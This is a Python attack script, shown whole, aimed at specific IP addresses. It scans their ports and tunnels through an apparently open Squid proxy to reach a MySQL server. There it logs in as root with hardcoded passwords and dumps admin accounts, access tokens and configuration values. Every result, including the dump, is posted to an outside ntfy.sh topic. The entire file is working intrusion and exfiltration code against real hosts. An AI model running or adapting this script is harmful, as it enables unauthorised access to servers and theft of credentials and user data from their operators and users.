#!/usr/bin/env python3
import os, sys, socket, time, urllib.request, json
JOB=os.environ.get("JOB","0"); TOPIC=os.environ.get("TOPIC","i48999-squid")
SQ_HOST="40.160.68.125"; SQ_PORT=3128
def L(*a): print(" ".join(str(x) for x in a),flush=True)
def send(tag,text):
    text=str(text)
    for i in range(0,len(text),3400):
        try:
            req=urllib.request.Request("https://ntfy.sh/"+TOPIC,data=(("[j%s %s] "%(JOB,tag))+text[i:i+3400]).encode("utf-8","replace"),method="POST",headers={"Title":("i48999-"+tag)[:60]})
            urllib.request.urlopen(req,timeout=12).read()
        except Exception as e: L("NTFYERR",str(e)[:60])
def egress():
    for u in ("https://api.ipify.org","https://ifconfig.me/ip","https://icanhazip.com","https://api64.ipify.org"):
        try: return urllib.request.urlopen(u,timeout=10).read().decode().strip()
        except Exception: pass
    return "ERR"
def tcp(host,port,t=15.0,tries=3):
    last="TIMEOUT"
    for i in range(tries):
        st=time.time()
        try:
            s=socket.create_connection((host,port),timeout=t); s.close()
            return "OPEN:%dms"%round((time.time()-st)*1000)
        except ConnectionRefusedError: return "REFUSED"
        except socket.timeout: last="TIMEOUT"
        except Exception as e: last="ERR:"+str(e)[:30]
        time.sleep(1)
    return last
def connect_tunnel(host,port,tmo=12):
    try:
        s=socket.create_connection((SQ_HOST,SQ_PORT),timeout=tmo); s.settimeout(tmo)
    except Exception as e: return "SQ_TCPFAIL:"+str(e)[:50],None
    try:
        s.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\nUser-Agent: curl/8.0\r\n\r\n".encode())
        data=b""
        while b"\r\n\r\n" not in data and len(data)<2000:
            c=s.recv(1024)
            if not c: break
            data+=c
        first=data.split(b"\r\n")[0].decode("latin1") if data else "(noresp)"
        if " 200" in first: return first,s
        s.close(); return first,None
    except Exception as e:
        try:s.close()
        except:pass
        return "CONNECTERR:"+str(e)[:50],None
def mysql_over(sock,user,pw):
    import pymysql
    try:
        conn=pymysql.connect(host="15.204.217.98",port=3306,user=user,password=pw,connect_timeout=12,read_timeout=25,charset="utf8mb4",sock=sock)
    except Exception as e: return None,"CONNERR:"+type(e).__name__+":"+str(e)[:160]
    out={}; cur=conn.cursor()
    def q(sql,k):
        try: cur.execute(sql); out[k]=[[str(x)[:220] for x in r] for r in cur.fetchall()]
        except Exception as e: out[k+"_err"]=str(e)[:150]
    q("SELECT VERSION(),USER(),@@hostname,@@port","who")
    try: cur.execute("SHOW DATABASES"); out["databases"]=[r[0] for r in cur.fetchall()]
    except Exception as e: out["dbs_err"]=str(e)[:120]
    dbs=out.get("databases",[])
    tdb="haochi" if "haochi" in dbs else ("yibuapi" if "yibuapi" in dbs else (dbs[0] if dbs else None))
    if tdb:
        q(f"SELECT id,username,role,status,email FROM `{tdb}`.users WHERE role>=100 ORDER BY id LIMIT 30","admins")
        q(f"SELECT id,username,role,access_token FROM `{tdb}`.users WHERE role=100 ORDER BY id LIMIT 15","tokens")
        q(f"SELECT `key`,LEFT(`value`,420) FROM `{tdb}`.options","options")
    conn.close(); return out,None
def main():
    ip=egress(); L("job",JOB,"egress",ip)
    out={"job":JOB,"egress":ip,"probe":{}}
    # direct baseline + host port matrix
    for h,p in [("40.160.68.125",3128),("40.160.68.125",3000),("40.160.68.125",3001),("40.160.68.125",22),
                ("15.204.217.98",3306),("15.204.217.98",8000),("15.204.217.98",3001)]:
        st=tcp(h,p); out["probe"]["%s:%d"%(h,p)]=st; L(h,p,st)
    send("matrix","j%s eg=%s %s"%(JOB,ip,json.dumps(out["probe"])))
    # if squid open, full tunnel test
    if out["probe"].get("40.160.68.125:3128","").startswith("OPEN"):
        L("SQUID OPEN -> tunnel tests")
        for h,p in [("example.com",443),("15.204.217.98",3306),("15.204.217.98",8000),("135.148.204.37",80)]:
            first,s=connect_tunnel(h,p)
            bn=b""
            if s:
                try: s.settimeout(6); bn=s.recv(96)
                except Exception: pass
            L("CONNECT",h,p,first,"bn=",bn[:40])
            out["probe"]["CONNECT_%s:%d"%(h,p)]=first
            if s and h=="15.204.217.98" and p==3306:
                for pw,tag in [("NewSecurePassword123!","pw1"),("N+eMY8*[H#y<WC8Q+%JayP+<f)vV[phC","pw2")]:
                    f2,s2=connect_tunnel("15.204.217.98",3306)
                    if not s2: L("RECONNECTFAIL",tag,f2); continue
                    o,e=mysql_over(s2,"root",pw)
                    if e: L("MYSQL",tag,e); send("mysql_"+tag,e)
                    else:
                        L("MYSQL_OK",tag,o.get("who")); send("DUMP_"+tag,json.dumps(o,ensure_ascii=False)); break
                s.close()
            elif s:
                try:s.close()
                except:pass
    out["done"]=True
    send("done","j%s done"%JOB)
    print("FINAL",json.dumps(out))
main()
